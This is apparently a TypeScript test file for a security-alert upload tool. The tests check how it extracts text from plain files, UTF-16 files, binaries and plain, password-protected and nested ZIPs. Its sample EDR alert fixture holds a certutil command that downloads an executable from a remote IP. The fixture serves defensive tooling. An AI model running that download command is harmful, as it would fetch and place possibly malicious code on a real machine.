// Uploaded alert files: text, binary, plain / password-protected / nested ZIPs.
import { describe, expect, test } from "bun:test";
import { BlobWriter, TextReader, Uint8ArrayReader, ZipWriter } from "@zip.js/zip.js";
import { extractAlertFile } from "../server/src/extract";

const ALERT = "EDR alert\ncertutil.exe -urlcache -f http://1.2.3.4/a.exe a.exe\n";
const text = (s: string) => new TextEncoder().encode(s);

async function zip(files: Record<string, string | Uint8Array>, password?: string): Promise<Uint8Array> {
  const writer = new ZipWriter(new BlobWriter("application/zip"), password ? { password, zipCrypto: true } : {});
  for (const [name, content] of Object.entries(files)) await writer.add(name, typeof content === "string" ? new TextReader(content) : new Uint8ArrayReader(content));
  return new Uint8Array(await (await writer.close()).arrayBuffer());
}

describe("alert file extraction", () => {
  test("plain text", async () => {
    const r = await extractAlertFile(text(ALERT), "alert.txt");
    expect(r).toMatchObject({ ok: true, kind: "text file", text: ALERT });
  });
  test("UTF-16 text with a byte-order mark", async () => {
    const r = await extractAlertFile(new Uint8Array([0xff, 0xfe, 0x45, 0, 0x44, 0, 0x52, 0]), "u16.txt");
    expect(r.text).toBe("EDR");
  });
  test("binary files are refused", async () => {
    const r = await extractAlertFile(new Uint8Array([0, 1, 2, 3, 0, 0, 9]), "capture.pcap");
    expect(r.ok).toBe(false);
    expect(r.kind).toBe("binary");
  });
  test("ZIP: text extracted, binary members skipped", async () => {
    const r = await extractAlertFile(await zip({ "alert.txt": ALERT, "blob.bin": new Uint8Array([0, 1, 2]) }), "a.zip");
    expect(r.ok).toBe(true);
    expect(r.text).toContain("certutil.exe");
    expect(JSON.parse(r.manifestJson)).toContainEqual({ name: "blob.bin", status: "binary skipped" });
  });
  test("ZIP locked with 'infected' opens automatically", async () => {
    const r = await extractAlertFile(await zip({ "alert.txt": ALERT }, "infected"), "sample.zip");
    expect(r.ok).toBe(true);
    expect(r.text).toContain("certutil.exe");
  });
  test("ZIP with another password needs it", async () => {
    const data = await zip({ "alert.txt": ALERT }, "s3cret");
    expect((await extractAlertFile(data, "x.zip")).ok).toBe(false);
    expect((await extractAlertFile(data, "x.zip", "s3cret")).ok).toBe(true);
  });
  test("nested ZIP is unpacked", async () => {
    const inner = await zip({ "alert.txt": ALERT });
    const r = await extractAlertFile(await zip({ "inner.zip": inner }), "outer.zip");
    expect(r.text).toContain("--- file: inner.zip!alert.txt ---");
  });
  test("text is capped at 24,000 characters", async () => {
    const r = await extractAlertFile(text("A".repeat(30_000)), "big.log");
    expect(r.text.length).toBe(24_000);
    expect(r.truncated).toBe(true);
  });
});
